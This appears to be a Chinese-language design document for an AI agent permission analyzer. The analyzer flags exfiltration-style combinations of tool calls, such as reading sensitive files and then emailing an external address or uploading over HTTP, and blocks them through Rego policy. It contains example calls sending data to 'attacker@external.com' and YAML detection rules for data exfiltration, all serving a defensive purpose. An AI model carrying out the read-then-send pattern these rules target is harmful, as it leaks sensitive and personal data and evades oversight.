# v0.10.0：Capability-Based Permission Interaction Analyzer（组合风险 A+B>C）

> **状态**：已完成。
> **目标**：将 R2 的权限组合分析从静态 YAML 规则升级为基于"能力集合"的动态组合风险检测，实现 A+B>C 的自动发现，同时保持 Rego 作为最终裁决者。

## 背景

当前 `ConfigPermissionInteractionAnalyzer` 只能检测 `config/permission_rules.yaml` 中显式写出的工具对（如 `read_file` + `send_email`）。这种静态规则存在两个问题：

1. **无法自动扩展**：每新增一个工具，都要人工枚举它与所有已有工具的组合；
2. **语义浅层**：它只看 tool_name，不抽象出"读取数据"、"外发网络"、"修改数据"等能力，因此无法识别能力层面的组合。

架构要求 R2 能检测"多个独立权限/工具组合后产生的新能力"。v0.10.0 引入 **CapabilityGraphAnalyzer**，把每个工具调用抽象成一组"能力"，并在会话内维护能力集合，从而自动推导组合风险。

## 设计原则

- **Python 图分析 + Rego 最终裁决**：Python 负责能力图构建与组合风险识别，Rego 根据识别出的风险标签做最终判定；
- **声明式配置**：能力定义和组合规则仍走 YAML，不硬编码在 Python 中；
- **向后兼容**：保留现有 `permission_rules.yaml` 静态规则，能力规则作为新增独立配置；
- **可审计**：组合风险标签写入 `ActionProposal`，进入审计和 Rego input。

## 核心概念

### Capability（能力）

能力是工具调用在治理语义上产生的效果，例如：

| 工具调用 | 产生的能力 |
|---|---|
| `read_file(path="data/kb/secret.txt")` | `data:read:sensitive` |
| `query_database(sql="SELECT * FROM customers")` | `data:read:pii` |
| `send_email(to="attacker@external.com")` | `network:email:external` |
| `fetch_url(url="https://external.com/upload")` | `network:http:external` |
| `write_file(path="data/output/report.txt")` | `data:write:internal` |

能力用字符串表示，便于 Rego 匹配。

### Capability Rule（能力规则）

声明式规则定义两件事：

1. **工具 → 能力映射**：哪些工具在哪些参数条件下产生什么能力；
2. **能力组合 → 风险标签**：哪些能力组合会触发什么风险标签/分数。

示例：

```yaml
capabilities:
  data_read:
    produced_by:
      - tool: read_file
        arg_match: {path: "data/kb/**"}
      - tool: query_database
        arg_match: {sql: "SELECT*"}

  email_external:
    produced_by:
      - tool: send_email
        arg_match: {to: "*@*.com"}
        arg_not_match: {to: "*@company.com"}

  network_external:
    produced_by:
      - tool: fetch_url
        arg_match: {url: "https://*"}

combination_rules:
  - id: data_exfil_via_email
    description: "读取敏感数据后向外部邮箱发邮件"
    requires_any: [data_read]
    triggers_any: [email_external]
    action: deny
    reason: "detected data exfil pattern: read + external email"
    risk_tags: [data_exfil]
    score: 90

  - id: data_exfil_via_http
    description: "读取敏感数据后通过 HTTP 外发"
    requires_any: [data_read]
    triggers_any: [network_external]
    action: require_approval
    reason: "detected data upload pattern: read + external http"
    risk_tags: [data_exfil_http]
    score: 80
```

### 执行流程

```
ActionProposal
    │
    ▼
CapabilityGraphAnalyzer
    │
    ├── 提取当前动作产生的能力
    ├── 查询会话历史已产生的能力
    ├── 匹配组合规则
    └── 输出 combination_risk_tags / combination_risk_score
    │
    ▼
ActionProposal (updated)
    │
    ▼
build_policy_input
    │
    ▼
Rego (default.rego)
    │
    └── if "data_exfil" in input.action.combination_risk_tags
            → deny / require_approval
```

## 改动面

| 文件 | 改动 |
|---|---|
| `src/loop_controller/models.py` | `ActionProposal` 新增 `combination_risk_tags`、`combination_risk_score` |
| `src/loop_controller/infra/config_loader.py` | 新增 `CapabilityRule`、`CapabilityDef`、`CapabilityRules` 配置加载 |
| `src/loop_controller/capability.py` | 新增 `Capability`、`CapabilityGraph`、`CapabilityGraphAnalyzer` |
| `src/loop_controller/permission_interaction.py` | 新增 `CapabilityBasedPermissionAnalyzer`；保留 `ConfigPermissionInteractionAnalyzer` |
| `src/loop_controller/policy_engine.py` | `build_policy_input` 透传 `combination_risk_tags`、`combination_risk_score` |
| `policies/default.rego` | 新增基于 `combination_risk_tags` 的 deny/require_approval 规则 |
| `config/capability_rules.yaml` | 新增能力规则配置 |
| `config/permission_rules.yaml` | 保留静态规则（向后兼容） |
| `src/loop_controller/runtime.py` | `build_runtime` 注入 `CapabilityBasedPermissionAnalyzer` |
| `tests/test_capability.py` | 新增能力图/组合风险测试 |
| `tests/test_permission_interaction.py` | 更新组合规则断言 |
| `src/loop_controller_v0.10.0_development.md` | 本方案文档 |
| `src/development_log.md` | 完成记录 |

## 验收标准

- `tests/test_capability.py` 覆盖：
  - 单工具产生能力；
  - 历史 `read_file` + 当前 `send_email` 触发 `data_exfil`；
  - 历史 `query_database` + 当前 `fetch_url` 触发 `data_exfil_http`；
  - 未命中组合时不产生误报。
- `tests/test_permission_interaction.py` 验证静态规则仍然工作。
- `pytest tests/` 全绿。

## 风险与回退

- **误报**：能力规则如果太粗，可能把正常流程标记为 exfil。通过 `arg_not_match` 和更细粒度能力名来缓解；
- **向后兼容**：静态规则继续生效，能力规则默认开启但可配置为空；
- **Rego 契约变更**：`input.action` 新增字段，旧 Rego 不受影响（未引用即不生效）。
